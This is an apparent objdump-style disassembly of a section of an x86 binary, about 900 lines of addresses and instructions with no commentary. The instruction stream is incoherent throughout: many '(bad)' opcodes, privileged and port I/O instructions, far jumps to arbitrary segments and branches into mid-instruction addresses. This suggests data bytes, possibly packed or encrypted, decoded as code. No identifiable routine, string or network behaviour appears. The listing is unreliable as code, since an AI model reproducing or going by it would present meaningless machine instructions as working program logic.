  425df2:	jns    0x425dfe
  425df4:	aaa    
  425df5:	int    0xab
  425df7:	call   0x4809:0xc6db4bb6
  425dfe:	pop    ebx
  425dff:	xor    eax,0x3d6777df
  425e04:	mov    WORD PTR [eax-0x2492f44a],fs
  425e0a:	cwde   
  425e0b:	lock ds or eax,0x5f820726
  425e12:	ds pop ebp
  425e14:	fist   DWORD PTR [edx-0x45]
  425e17:	adc    eax,0x52a6aa79
  425e1c:	sti    
  425e1d:	mov    al,0xd7
  425e1f:	jp     0x425da8
  425e21:	dec    edi
  425e22:	fst    QWORD PTR [esi]
  425e24:	pop    esp
  425e25:	inc    esi
  425e26:	pop    es
  425e27:	jo     0x425e67
  425e29:	xchg   esp,eax
  425e2a:	mov    dl,0xbd
  425e2c:	ret    
  425e2d:	(bad)  
  425e2e:	(bad)  
  425e2f:	outs   dx,BYTE PTR ds:[esi]
  425e30:	ins    BYTE PTR es:[edi],dx
  425e31:	(bad)  
  425e32:	fdivp  st(2),st
  425e34:	or     eax,0xe4e91d0b
  425e39:	push   es
  425e3a:	ins    BYTE PTR es:[edi],dx
  425e3b:	rcl    esi,1
  425e3d:	ret    0x1097
  425e40:	inc    ebp
  425e41:	mov    al,ds:0x5b8b1d7e
  425e46:	mov    al,ds:0x47de6b70
  425e4b:	mov    ebp,0x2636a083
  425e50:	add    bl,bl
  425e52:	mov    dh,0x50
  425e54:	jle    0x425de5
  425e56:	rol    DWORD PTR [eax],cl
  425e58:	ins    BYTE PTR es:[edi],dx
  425e59:	arpl   WORD PTR [edi],si
  425e5b:	dec    edi
  425e5c:	ret    0xd184
  425e5f:	or     DWORD PTR [edi],esi
  425e61:	fidivr DWORD PTR [edx]
  425e63:	mov    al,ds:0x8c84faf7
  425e68:	mov    WORD PTR [eax-0xd],ds
  425e6b:	inc    edi
  425e6c:	fsub   DWORD PTR [eax+0x6b]
  425e6f:	dec    ebx
  425e70:	pop    ss
  425e71:	dec    ecx
  425e72:	gs mov al,0x38
  425e75:	mov    edx,es
  425e77:	fsub   QWORD PTR [edx-0x2fd7a48b]
  425e7d:	jno    0x425ebd
  425e7f:	addr16 retf 0xc4bd
  425e83:	cld    
  425e84:	fld    TBYTE PTR [eax+0x2]
  425e87:	or     BYTE PTR ds:[ebx+0x16],0xf4
  425e8c:	xchg   edi,eax
  425e8d:	jmp    0x76b7:0x14d02983
  425e94:	adc    eax,0xf4656bd8
  425e99:	xchg   edi,eax
  425e9a:	mov    BYTE PTR [ecx],dh
  425e9c:	(bad)  [esi+0x2785b1b0]
  425ea2:	idiv   ch
  425ea4:	pop    es
  425ea5:	cdq    
  425ea6:	pop    ecx
  425ea7:	mov    ah,0x56
  425ea9:	push   DWORD PTR [eax+0x2b]
  425eac:	inc    ebp
  425ead:	or     esp,edx
  425eaf:	imul   ecx,DWORD PTR fs:[ecx-0x64498e21],0x63
  425eb7:	mov    eax,ds:0xf93d96d
  425ebc:	push   cs
  425ebd:	mov    cl,ch
  425ebf:	mov    edi,0x604ba5d1
  425ec4:	cmp    BYTE PTR [edi-0x5e482659],0xdc
  425ecb:	mov    dh,0xca
  425ecd:	mov    bh,0x24
  425ecf:	add    eax,0xdbbe0000
  425ed4:	icebp  
  425ed5:	stc    
  425ed6:	in     al,dx
  425ed7:	mov    esi,0x1b837c61
  425edc:	(bad)  
  425ede:	enter  0xe518,0x92
  425ee2:	stos   BYTE PTR es:[edi],al
  425ee3:	push   eax
  425ee4:	add    BYTE PTR [ecx+edx*2],bl
  425ee7:	popa   
  425ee8:	fcmovnu st,st(2)
  425eea:	lods   eax,DWORD PTR ds:[esi]
  425eeb:	or     BYTE PTR [esi-0x71],dl
  425eee:	(bad)  
  425eef:	push   0x8e0d65ff
  425ef4:	call   0xc1a4957b
  425ef9:	outs   dx,BYTE PTR ds:[esi]
  425efa:	data16 or BYTE PTR [eax],al
  425efd:	inc    esi
  425efe:	pop    es
  425eff:	mov    cl,0x5d
  425f01:	mov    al,ds:0xa974a562
  425f06:	stos   DWORD PTR es:[edi],eax
  425f07:	stc    
  425f08:	xchg   esi,eax
  425f09:	test   al,0xed
  425f0b:	rol    dl,cl
  425f0d:	push   ss
  425f0e:	jns    0x425f06
  425f10:	gs repnz jmp 0x9b51:0xd1bb66a7
  425f19:	and    bl,bl
  425f1b:	jne    0x425f01
  425f1d:	mov    es,esi
  425f1f:	and    al,0x2b
  425f21:	aam    0x37
  425f23:	cmp    ch,BYTE PTR [eax]
  425f25:	push   0x62fd8f3
  425f2a:	mov    dh,0xba
  425f2c:	in     eax,0x17
  425f2e:	mov    dh,0x4a
  425f30:	retf   
  425f31:	shr    ebp,cl
  425f33:	jmp    0x425f89
  425f35:	popf   
  425f36:	add    BYTE PTR [ebx+0x68],al
  425f39:	mov    eax,0xf54b0b6d
  425f3e:	and    eax,0xdf35176a
  425f43:	mov    esp,edx
  425f45:	les    esi,FWORD PTR [esi+0x6e80eb76]
  425f4b:	stc    
  425f4c:	sahf   
  425f4d:	sub    cl,BYTE PTR ds:0x5d52a11d
  425f53:	ficom  DWORD PTR [esi-0x67baad4a]
  425f59:	sub    eax,0x814a02ce
  425f5e:	mov    ebx,0x6c54d8fb
  425f63:	ins    DWORD PTR es:[edi],dx
  425f64:	fs loop 0x425efd
  425f67:	jno    0x425ef6
  425f69:	pop    es
  425f6a:	inc    ecx
  425f6b:	push   0x6061605b
  425f70:	hlt    
  425f71:	push   ebx
  425f72:	dec    esi
  425f73:	aad    0x1a
  425f75:	or     DWORD PTR [esi+0x5b],ebp
  425f78:	test   DWORD PTR ds:0xb8256ab0,eax
  425f7e:	inc    esi
  425f7f:	stos   BYTE PTR es:[edi],al
  425f80:	xchg   esi,eax
  425f81:	pop    esp
  425f82:	mov    ebx,0x4502e8b9
  425f87:	sbb    DWORD PTR [ecx-0x28f59992],eax
  425f8d:	mov    dh,0xb
  425f8f:	pop    ebx
  425f90:	ins    DWORD PTR es:[edi],dx
  425f91:	outs   dx,DWORD PTR ds:[esi]
  425f92:	mov    al,0x9a
  425f94:	mov    WORD PTR [edi],es
  425f96:	jmp    0x425f3c
  425f98:	add    eax,0xd855bb3c
  425f9d:	mov    dh,0x2e
  425f9f:	push   es
  425fa0:	pop    ecx
  425fa1:	push   edi
  425fa2:	xchg   edi,eax
  425fa3:	dec    edi
  425fa4:	sahf   
  425fa5:	frstor [eax]
  425fa7:	mov    ch,0x5b
  425fa9:	or     ebp,DWORD PTR [ebp+0x4f]
  425fac:	mov    ebx,0x1a82a725
  425fb1:	xor    eax,esp
  425fb3:	fst    QWORD PTR [esi]
  425fb5:	xchg   esi,eax
  425fb6:	das    
  425fb7:	mov    ecx,0xfd006d5f
  425fbc:	pop    edi
  425fbd:	mov    eax,0xb9de17bb
  425fc2:	outs   dx,BYTE PTR ds:[esi]
  425fc3:	sbb    ebp,DWORD PTR [ebp+0x36bab0a2]
  425fc9:	cmp    DWORD PTR [edx-0x29390dac],edx
  425fcf:	inc    edx
  425fd0:	fstp   TBYTE PTR [ebp+0x70]
  425fd3:	jmp    0x4d43a9ba
  425fd8:	xchg   ebx,eax
  425fd9:	test   edx,esi
  425fdb:	sub    ebp,0x19ed8a9
  425fe1:	js     0x425f8a
  425fe3:	cwde   
  425fe4:	inc    eax
  425fe5:	mov    bh,0xb
  425fe7:	sbb    eax,0xfd2fced0
  425fec:	mov    esi,0x86c8f4ac
  425ff1:	pop    ebx
  425ff2:	add    BYTE PTR [eax+0x58],bl
  425ff5:	push   0xc9bcd6cb
  425ffa:	out    dx,eax
  425ffb:	and    eax,0xb7c7107d
  426000:	push   cs
  426001:	call   0x2a6fde
  426006:	adc    cl,BYTE PTR [esi-0x43]
  426009:	push   cs
  42600a:	sub    eax,0x2b6ddaa0
  42600f:	or     edx,DWORD PTR [ebp-0x7c]
  426012:	sub    al,0x3e
  426014:	repnz or BYTE PTR [esi],0x1a
  426018:	adc    dl,ch
  42601a:	and    dl,BYTE PTR [esi-0x38f21e11]
  426020:	(bad)  
  426021:	test   al,0xb6
  426023:	lea    edx,[edx]
  426025:	pop    ebp
  426026:	push   0x8a081ccf
  42602b:	in     eax,dx
  42602c:	(bad)  
  42602d:	ret    0xe291
  426030:	xlat   BYTE PTR ds:[ebx]
  426031:	hlt    
  426032:	or     bh,BYTE PTR [ecx+0x68]
  426035:	push   edx
  426036:	(bad)  [esi+0x59f9a9a8]
  42603c:	sub    esi,esp
  42603e:	mov    dl,BYTE PTR gs:[esi+esi*4]
  426042:	mov    ch,0xed
  426044:	inc    edx
  426045:	dec    esp
  426046:	jle    0x426094
  426048:	retf   
  426049:	mov    dh,0x2
  42604b:	pop    ecx
  42604c:	mov    ch,0x5f
  42604e:	in     eax,0xc2
  426050:	mov    dh,0x9d
  426053:	or     al,0x12
  426055:	jmp    0x2eb6:0xaa110d8b
  42605c:	mov    BYTE PTR [ebx],cl
  42605e:	popa   
  42605f:	mov    eax,ds:0xf2ec3cac
  426064:	sbb    BYTE PTR [ebp+0x10],0xb7
  426068:	ss push ecx
  42606a:	pushf  
  42606b:	sbb    al,0x93
  42606d:	in     al,0x84
  42606f:	loope  0x42602c
  426071:	xor    eax,0xeb026e96
  426076:	jp     0x42609b
  426078:	aas    
  426079:	daa    
  42607a:	sub    ebp,eax
  42607c:	inc    esi
  42607d:	dec    ebp
  42607e:	xor    eax,0x1b405b04
  426083:	lock inc edi
  426085:	mov    bh,0xb6
  426087:	push   esi
  426088:	sar    BYTE PTR [eax-0x4bd92144],1
  42608e:	sbb    dl,0x1f
  426091:	mov    ah,0x6d
  426093:	jmp    0x42606f
  426095:	xlat   BYTE PTR ds:[ebx]
  426096:	inc    eax
  426097:	xchg   edi,eax
  426098:	shr    DWORD PTR [edi],cl
  42609a:	int    0x86
  42609c:	dec    BYTE PTR [ebx+eiz*4+0x36e0a03]
  4260a3:	jno    0x42605b
  4260a5:	mov    ah,0x8c
  4260a7:	cvtdq2ps xmm3,xmm3
  4260aa:	jbe    0x42610f
  4260ac:	das    
  4260ad:	add    ecx,DWORD PTR [edi+0x2e]
  4260b0:	gs call 0xd6db:0x673153bf
  4260b8:	push   ecx
  4260b9:	ins    DWORD PTR es:[edi],dx
  4260ba:	aam    0x4
  4260bc:	call   0xc93cc098
  4260c1:	sahf   
  4260c2:	mov    ebx,0x82b42e95
  4260c7:	loopne 0x426115
  4260c9:	stos   DWORD PTR es:[edi],eax
  4260ca:	shl    BYTE PTR [edx-0x44],1
  4260cd:	fst    DWORD PTR [eax+eiz*1+0x5b]
  4260d1:	cmp    ebp,DWORD PTR [eax-0x6fb1bda0]
  4260d7:	add    ebp,DWORD PTR [esi]
  4260d9:	add    al,BYTE PTR [eax-0x69]
  4260dc:	mov    dh,0x5a
  4260de:	cmp    al,BYTE PTR [edx-0x64e41602]
  4260e4:	mov    BYTE PTR [ebx+0x5b],cl
  4260e7:	inc    edi
  4260e8:	fisub  WORD PTR [ebx-0x62]
  4260eb:	js     0x42610a
  4260ed:	xchg   edi,eax
  4260ee:	cs dec ebx
  4260f0:	add    eax,0x43e6e858
  4260f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260f6:	(bad)
  4260fa:	mov    dh,0x6
  4260fc:	aad    0x6e
  4260fe:	ds push cs
  426100:	fiadd  WORD PTR [eax-0x2ebff7f2]
  426106:	inc    esp
  426107:	fcom   QWORD PTR [esi-0x3ba64c86]
  42610d:	mov    eax,ds:0xdbb61856
  426112:	mov    dh,0xb5
  426114:	adc    al,BYTE PTR [edi+0x6c175419]
  42611a:	in     al,dx
  42611b:	ror    eax,1
  42611d:	cwde   
  42611e:	aas    
  42611f:	mov    dh,0x6d
  426121:	pop    ebp
  426122:	cli    
  426123:	into   
  426124:	pusha  
  426125:	(bad)  
  426126:	xor    dh,BYTE PTR fs:[esi-0x6b]
  42612a:	xor    bl,BYTE PTR [eax+ebx*4-0x496bd4be]
  426131:	xlat   BYTE PTR ds:[ebx]
  426132:	and    al,0x89
  426134:	ficomp WORD PTR [ecx+0x79]
  426137:	fistp  DWORD PTR gs:[edx]
  42613a:	rcl    BYTE PTR [esp+edi*2],1
  42613d:	sahf   
  42613e:	leave  
  42613f:	mov    ecx,0x176b76d6
  426144:	mov    dh,0x30
  426146:	into   
  426147:	jo     0x4261bc
  426149:	aam    0xef
  42614b:	out    0xf5,al
  42614d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42614e:	arpl   WORD PTR [edx+ebx*8],dx
  426151:	outs   dx,DWORD PTR ds:[esi]
  426152:	sub    ebx,edx
  426154:	mov    al,bh
  426156:	add    eax,esp
  426158:	dec    ebp
  426159:	xchg   ecx,eax
  42615a:	push   es
  42615b:	lods   eax,DWORD PTR ds:[esi]
  42615c:	ss mov dh,0x5f
  42615f:	fstp   QWORD PTR [eax-0x74679f47]
  426165:	inc    esp
  426166:	pop    esp
  426167:	outs   dx,BYTE PTR ds:[esi]
  426168:	cdq    
  426169:	nop
  42616a:	ins    DWORD PTR es:[edi],dx
  42616b:	mov    bh,0x2e
  42616d:	fsub   st,st(3)
  42616f:	ins    BYTE PTR es:[edi],dx
  426170:	and    bh,BYTE PTR [edi+0x265f9c98]
  426176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426177:	test   DWORD PTR [ebp+0x653bad85],ecx
  42617d:	lods   al,BYTE PTR ds:[esi]
  42617e:	les    esi,FWORD PTR [esi-0x491a6ac4]
  426184:	fbld   TBYTE PTR [ebp-0x4113d85b]
  42618a:	push   esi
  42618b:	cmp    al,cl
  42618d:	jno    0x42612d
  42618f:	sbb    BYTE PTR [ecx+0x75],al
  426192:	or     esp,DWORD PTR [ebp+0x50222068]
  426198:	push   edx
  426199:	sbb    al,0xf7
  42619b:	aaa    
  42619c:	push   ss
  42619d:	push   0x32812a01
  4261a2:	push   edi
  4261a3:	xchg   esp,eax
  4261a4:	inc    ecx
  4261a5:	outs   dx,BYTE PTR ds:[esi]
  4261a6:	pop    ds
  4261a7:	fmul   QWORD PTR [edx+0xe]
  4261aa:	shl    DWORD PTR [ebx+0x5a],1
  4261ad:	and    BYTE PTR [ebp+0x56],ah
  4261b0:	(bad)  
  4261b1:	out    0xdb,eax
  4261b3:	mov    dh,0xd6
  4261b6:	outs   dx,BYTE PTR ds:[esi]
  4261b7:	sbb    eax,0x39ea3066
  4261bc:	add    al,0x1a
  4261be:	and    DWORD PTR [ecx+0x645b6dba],ecx
  4261c4:	test   BYTE PTR [edx-0x24],cl
  4261c7:	imul   ebp,DWORD PTR [ecx+ecx*1+0x76],0xffffffb6
  4261cc:	lods   eax,DWORD PTR ds:[esi]
  4261cd:	jno    0x426172
  4261cf:	dec    eax
  4261d0:	call   edx
  4261d2:	std    
  4261d3:	push   ecx
  4261d4:	push   ebx
  4261d5:	add    BYTE PTR [edx+esi*2-0x4c],bl
  4261d9:	mov    al,0x51
  4261db:	mov    BYTE PTR [esi],dl
  4261dd:	jle    0x4261a4
  4261df:	xchg   esp,eax
  4261e0:	jnp    0x4261fc
  4261e2:	aad    0x2e
  4261e4:	mov    cl,0xdd
  4261e6:	jl     0x426170
  4261e8:	adc    ecx,DWORD PTR [ebx+0x5]
  4261eb:	sbb    ebx,DWORD PTR [ebx+0x7]
  4261ee:	mov    cl,0xdd
  4261f0:	or     DWORD PTR [esp+ebx*1],0x5f
  4261f4:	ret    0xd818
  4261f7:	imul   esi,DWORD PTR [eax],0x6b
  4261fa:	pop    ebx
  4261fb:	sub    dl,BYTE PTR [ecx]
  4261fd:	push   0xb950c2fe
  426202:	call   0x74be90dd
  426207:	cs pop ecx
  426209:	popf   
  42620a:	lock and cl,BYTE PTR [ecx-0x65]
  42620e:	sahf   
  42620f:	sub    al,0xb6
  426211:	add    ebx,ecx
  426213:	(bad)  
  426214:	cmp    eax,0x8d5b7cea
  426219:	dec    edx
  42621a:	into   
  42621b:	pop    edx
  42621c:	or     BYTE PTR [esp+edx*8],bl
  42621f:	jno    0x4261b6
  426221:	pop    ss
  426222:	fcmovnu st,st(3)
  426224:	pop    edx
  426225:	pop    edx
  426226:	pop    eax
  426227:	jge    0x4261a9
  426229:	pop    ds
  42622a:	pop    ss
  42622b:	ds enter 0xd5bb,0x8f
  426230:	sub    eax,0x8a60142d
  426235:	and    eax,0x6fc639d9
  42623a:	lods   eax,DWORD PTR ds:[esi]
  42623b:	lods   eax,DWORD PTR ds:[esi]
  42623c:	in     eax,0xbf
  42623e:	mov    al,0x65
  426240:	mov    es,WORD PTR [eax]
  426242:	ja     0x4262b7
  426244:	add    BYTE PTR [ecx+0x7db5c76f],ah
  42624a:	hlt    
  42624b:	test   al,0x42
  42624d:	mov    bh,0x6d
  42624f:	fwait
  426250:	mov    al,ds:0xbd6e14bc
  426255:	cli    
  426256:	pop    eax
  426257:	push   0xc34216a0
  42625c:	mov    edx,0x855c430d
  426261:	jbe    0x4262be
  426263:	fcomp  DWORD PTR [ecx+0x59838258]
  426269:	iret   
  42626a:	mov    dl,0x6b
  42626c:	cs loopne 0x4262e6
  42626f:	fcmovnu st,st(2)
  426271:	js     0x42624a
  426273:	mov    ecx,0x882cd30e
  426278:	ror    BYTE PTR [ecx-0x492dfed4],0x0
  42627f:	mov    ecx,0xf2ff2c88
  426284:	adc    bl,bh
  426286:	xor    dl,BYTE PTR [esi+esi*4]
  426289:	fist   DWORD PTR [ebx+0x14abf192]
  42628f:	jmp    0x426276
  426291:	mov    ds,eax
  426293:	outs   dx,BYTE PTR ds:[esi]
  426294:	pop    ds
  426295:	pop    ebp
  426296:	loopne 0x4262cf
  426298:	out    0x3d,al
  42629a:	jne    0x4262cb
  42629c:	jns    0x42628a
  42629e:	pop    ecx
  42629f:	fist   WORD PTR [esi]
  4262a1:	dec    edx
  4262a2:	mov    cl,0xd0
  4262a4:	xor    BYTE PTR [ecx],al
  4262a6:	inc    esi
  4262a7:	(bad)  
  4262a8:	popf   
  4262a9:	inc    ebp
  4262aa:	or     dl,BYTE PTR ss:[edi-0x5afa628]
  4262b1:	xor    al,0xf5
  4262b3:	xor    DWORD PTR [edx+ebx*1-0x7249c9ea],ebx
  4262ba:	sub    BYTE PTR [edx+0x59],0x58
  4262be:	xchg   DWORD PTR [ebx-0x35e9fed],esi
  4262c4:	(bad)  
  4262c5:	test   al,0x22
  4262c7:	sahf   
  4262c8:	xchg   DWORD PTR [ecx+0x7969bf00],ebx
  4262ce:	ins    BYTE PTR es:[edi],dx
  4262cf:	and    eax,0x874075aa
  4262d4:	inc    ebx
  4262d5:	ins    DWORD PTR es:[edi],dx
  4262d6:	cmc    
  4262d7:	out    0xb6,eax
  4262d9:	and    DWORD PTR [eax+0x26d6c42d],edi
  4262df:	lods   eax,DWORD PTR ds:[esi]
  4262e0:	mov    ds:0xcb82a16e,eax
  4262e5:	call   0x5a1859c0
  4262ea:	xchg   edx,eax
  4262eb:	sbb    ch,dh
  4262ed:	xor    eax,0xdb3f84f7
  4262f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f3:	lods   eax,DWORD PTR ds:[esi]
  4262f4:	scas   al,BYTE PTR es:[edi]
  4262f5:	adc    edi,DWORD PTR [eax]
  4262f7:	mov    cl,bl
  4262f9:	adc    al,0xcd
  4262fb:	loopne 0x426374
  4262fd:	sub    BYTE PTR [ebp+0x356b616a],dh
  426303:	mov    ecx,0x940a2b79
  426308:	loop   0x4262cc
  42630a:	shl    BYTE PTR [esi+0x3cdd6220],cl
  426310:	(bad)
  426313:	mov    ds,ebp
  426315:	mov    dh,0x8d
  426317:	mov    dh,0x23
  426319:	icebp  
  42631a:	pop    ebp
  42631b:	dec    edx
  42631c:	mov    ecx,0x72fe7aab
  426321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426322:	pop    ebx
  426323:	popa   
  426324:	or     ecx,DWORD PTR ds:0x5cb38ef1
  42632a:	push   ds
  42632b:	dec    edx
  42632c:	add    DWORD PTR [ebp+0x10],ebx
  42632f:	mov    bh,0x95
  426331:	mov    WORD PTR [ebp+0x4a],cs
  426334:	rcr    ch,0xda
  426337:	or     BYTE PTR [esi],dl
  426339:	or     bh,BYTE PTR [ebx+0x46]
  42633c:	fsub   DWORD PTR [eax-0x2eb36b53]
  426342:	push   es
  426343:	inc    edi
  426344:	in     al,0xe5
  426346:	jp     0x42637f
  426348:	test   edx,eax
  42634a:	push   ebp
  42634b:	sbb    edi,DWORD PTR [edi-0x7c1bbf45]
  426351:	cs fidiv DWORD PTR ss:[edx+0x30]
  426356:	dec    edx
  426357:	lea    esp,[ebp+0x68b6f521]
  42635d:	mov    bh,0xa5
  42635f:	in     eax,dx
  426360:	jl     0x426376
  426362:	clc    
  426363:	pop    ecx
  426364:	inc    ecx
  426365:	mov    eax,ds:0xba1ad451
  42636a:	sar    DWORD PTR [edx],1
  42636c:	pop    edx
  42636d:	adc    ecx,DWORD PTR [edi+0xd]
  426370:	mov    BYTE PTR [ecx+0xf],al
  426373:	(bad)  
  426374:	js     0x4263ca
  426376:	loop   0x4263be
  426378:	pop    ebx
  426379:	dec    ebp
  42637a:	jge    0x4263a5
  42637c:	add    edx,DWORD PTR [esi+0xada7c05]
  426382:	mov    bh,0x46
  426384:	data16 xor dl,BYTE PTR [esi+edx*1-0x273e400c]
  42638c:	mov    dh,0x1a
  42638e:	aaa    
  42638f:	push   0x4b
  426391:	(bad)  
  426392:	mov    edx,0x5d47e56d
  426397:	ins    DWORD PTR es:[edi],dx
  426398:	or     edx,DWORD PTR [edi-0x4359f56a]
  42639e:	sub    DWORD PTR [ecx],ebp
  4263a0:	fdiv   QWORD PTR [esp+ebp*8+0x6e]
  4263a4:	and    eax,0xf2a16368
  4263a9:	inc    esi
  4263aa:	ficom  WORD PTR [esi-0x2722eaa7]
  4263b0:	sub    BYTE PTR [ecx+0x48],al
  4263b3:	aad    0x42
  4263b5:	lahf   
  4263b6:	out    dx,eax
  4263b7:	not    BYTE PTR [esi]
  4263b9:	mov    dh,0xad
  4263bb:	mov    ah,0x56
  4263bd:	mov    ch,0x8c
  4263bf:	clc    
  4263c0:	add    ebp,eax
  4263c2:	jp     0x4263da
  4263c4:	jmp    0xdbb011a3
  4263c9:	aam    0x9
  4263cb:	mov    esp,0x226347a9
  4263d0:	push   cs
  4263d1:	sub    al,0x68
  4263d3:	ret    0x61b6
  4263d6:	fcomp  DWORD PTR [eax+0x8848ea2]
  4263dc:	outs   dx,BYTE PTR ds:[esi]
  4263dd:	sub    bl,BYTE PTR [esi+0x1b]
  4263e0:	or     eax,DWORD PTR [ebp+0x4db73ded]
  4263e6:	popf   
  4263e7:	dec    esp
  4263e8:	adc    BYTE PTR [eax],0x2a
  4263eb:	je     0x426370
  4263ed:	cs ins BYTE PTR es:[edi],dx
  4263ef:	sbb    ebp,edx
  4263f1:	cli    
  4263f2:	mov    WORD PTR [eax+0x28],ds
  4263f5:	xlat   BYTE PTR ds:[ebx]
  4263f6:	cmp    BYTE PTR [esi-0x6f292494],0x86
  4263fd:	push   ds
  4263fe:	mov    ebx,eax
  426400:	into   
  426401:	push   ecx
  426402:	aam    0x2f
  426404:	and    eax,esp
  426406:	push   edx
  426407:	mov    ebx,0x44959677
  42640c:	fld    TBYTE PTR [ebx-0x5a29725e]
  426412:	lods   eax,DWORD PTR ds:[esi]
  426413:	xor    eax,0xfd65db35
  426418:	loope  0x426454
  42641a:	aas    
  42641b:	dec    edx
  42641c:	(bad)  [ebp+0x55ef1ad]
  426422:	das    
  426423:	ds clc 
  426425:	(bad)
  426428:	ins    DWORD PTR es:[edi],dx
  426429:	imul   ebp,DWORD PTR [ebp-0x69],0xffffffb0
  42642d:	out    0x81,al
  42642f:	cwde   
  426430:	mov    eax,0x77882382
  426435:	jbe    0x4264a0
  426437:	imul   esi,DWORD PTR [edi-0x181d1c71],0xffffffc5
  42643e:	stos   BYTE PTR es:[edi],al
  42643f:	fcomp  st(5)
  426441:	lods   al,BYTE PTR ds:[esi]
  426442:	and    BYTE PTR [ebx+ebx*8],ch
  426445:	push   0xc17b637
  42644a:	in     eax,dx
  42644b:	lods   eax,DWORD PTR ds:[esi]
  42644c:	pushw  cs
  42644e:	sbb    edx,DWORD PTR [edx]
  426450:	or     edx,DWORD PTR [esi-0x42]
  426453:	shl    BYTE PTR [esi-0x1e],1
  426456:	cmp    edi,DWORD PTR [eax]
  426458:	sub    BYTE PTR [esi+0x1c],ch
  42645b:	add    BYTE PTR [ecx+ebx*4],bl
  42645e:	(bad)  
  42645f:	xor    al,0xb6
  426461:	dec    ebx
  426462:	fist   DWORD PTR [ebx+ecx*1+0x2ab5fbd6]
  426469:	sahf   
  42646a:	test   DWORD PTR [edx+0x2c2d6db6],esp
  426470:	cli    
  426471:	jbe    0x426449
  426473:	daa    
  426474:	xchg   edi,eax
  426475:	(bad)  
  426476:	cmp    ebx,DWORD PTR [ecx]
  426478:	jp     0x4264e2
  42647a:	sub    ebx,DWORD PTR [edi-0x18]
  42647d:	(bad)  
  42647f:	je     0x426483
  426481:	add    BYTE PTR [edx-0x70],ch
  426484:	enter  0xdc34,0xea
  426488:	and    BYTE PTR [esi],dh
  42648a:	push   ebp
  42648b:	int    0x93
  42648d:	xor    eax,0xb6233b79
  426492:	fstp   QWORD PTR [eax+0x28]
  426495:	mov    ebx,0x84dbc1c4
  42649a:	mul    eax
  42649c:	add    esp,DWORD PTR [edx-0x6c]
  42649f:	outs   dx,DWORD PTR ds:[esi]
  4264a0:	sbb    esi,DWORD PTR [edi-0x4894f644]
  4264a6:	pushf  
  4264a7:	pop    edi
  4264a8:	mov    bl,0x0
  4264aa:	stos   DWORD PTR es:[edi],eax
  4264ab:	sbb    esi,DWORD PTR ds:0x1c2ed1b8
  4264b1:	mov    ?,WORD PTR [ebx+0x43200f95]
  4264b7:	adc    al,0xa9
  4264b9:	ins    DWORD PTR es:[edi],dx
  4264ba:	push   ebp
  4264bb:	mov    ebx,0x35f06e44
  4264c0:	inc    ebx
  4264c1:	jbe    0x4264be
  4264c3:	retf   
  4264c4:	lea    eax,[ebp-0x13129273]
  4264ca:	mov    ebp,DWORD PTR [esi-0x129f3511]
  4264d0:	pop    ebx
  4264d1:	lea    esp,[esi]
  4264d3:	xchg   esi,eax
  4264d4:	sub    eax,0x3fd6dc54
  4264d9:	cmp    eax,0x6db041cf
  4264de:	or     edx,ebx
  4264e0:	adc    DWORD PTR fs:[ebp+ebx*8+0x74],ebx
  4264e5:	ins    DWORD PTR es:[edi],dx
  4264e6:	ins    DWORD PTR es:[edi],dx
  4264e7:	push   edi
  4264e8:	mov    al,0x37
  4264ea:	adc    eax,0x6e7f0cd7
  4264ef:	sbb    bh,ch
  4264f1:	ret    0xb6c2
  4264f4:	mov    cl,0x8f
  4264f6:	popa   
  4264f7:	mov    bh,0xd4
  4264f9:	jp     0x4264e0
  4264fb:	pop    ebx
  4264fc:	cmp    BYTE PTR [edi],al
  4264fe:	(bad)  
  4264ff:	adc    bl,BYTE PTR [ebx-0x25]
  426502:	and    eax,0x6cb5a2a7
  426507:	mov    ?,ebp
  426509:	cmp    bl,bl
  42650b:	adc    al,BYTE PTR [ebp-0x36d0e425]
  426511:	lahf   
  426512:	aaa    
  426513:	mov    BYTE PTR [ebx+0x502d2abf],bl
  426519:	ins    BYTE PTR es:[edi],dx
  42651a:	mov    ah,0x60
  42651c:	push   esi
  42651d:	stc    
  42651e:	jge    0x42658a
  426520:	xor    eax,0x6d51d012
  426525:	jl     0x4265a0
  426527:	sub    esi,DWORD PTR [esp+eax*1-0x49c895a5]
  42652e:	add    eax,0x807751f2
  426533:	in     al,dx
  426534:	push   eax
  426535:	jle    0x4264c0
  426537:	push   0xe570b6db
  42653c:	jle    0x42655d
  42653e:	test   al,0x95
  426540:	fnstenv ds:0xb817d442
  426546:	sar    BYTE PTR [edx-0x53bb53e4],1
  42654c:	fidivr WORD PTR [edi+ebp*2]
  42654f:	adc    DWORD PTR [eax],eax
  426551:	ss ss dec edx
  426554:	retf   
  426555:	jge    0x4265d1
  426557:	cwde   
  426558:	dec    ebp
  426559:	pushf  
  42655a:	test   DWORD PTR [edi],edi
  42655c:	shl    BYTE PTR [esi+0x170ad5b1],0x16
  426563:	cmp    eax,0x2c233c43
  426568:	dec    ebx
  426569:	fcmovnb st,st(2)
  42656b:	pop    edx
  42656c:	jae    0x426595
  42656e:	fucomp st(7)
  426570:	out    dx,eax
  426571:	and    eax,0x20e51b8f
  426576:	mov    eax,DWORD PTR cs:[ecx+0x309f9c9]
  42657d:	mov    ebx,0xedb52db5
  426582:	jecxz  0x4265da
  426584:	jecxz  0x4265be
  426586:	xlat   BYTE PTR ds:[ebx]
  426587:	sub    BYTE PTR [bp+si-0x1a],cl
  42658b:	or     ebp,DWORD PTR [ebp-0x1d]
  42658e:	push   edx
  42658f:	lds    eax,FWORD PTR ds:[edi+0x5a]
  426593:	dec    eax
  426594:	retf   
  426595:	jae    0x426574
  426597:	fucomi st,st(2)
  426599:	or     BYTE PTR [esi+0x26],ch
  42659c:	cmp    ebx,ebp
  42659e:	aaa    
  42659f:	dec    eax
  4265a0:	jo     0x4265f9
  4265a2:	cmp    BYTE PTR [esi+0x6b7044d0],dh
  4265a8:	mov    esi,0x34a05f51
  4265ad:	cmp    BYTE PTR [esi*4-0x5c5412f5],ch
  4265b4:	gs pop eax
  4265b6:	xchg   edi,eax
  4265b7:	mov    al,0xce
  4265b9:	push   esi
  4265ba:	pand   mm1,QWORD PTR [edx+0x4d]
  4265be:	sub    al,0x4f
  4265c0:	clc    
  4265c1:	cli    
  4265c2:	retf   
  4265c3:	and    BYTE PTR [esi+eiz*8-0x5e8bac26],0x76
  4265cb:	aas    
  4265cc:	stos   BYTE PTR es:[edi],al
  4265cd:	xchg   edx,eax
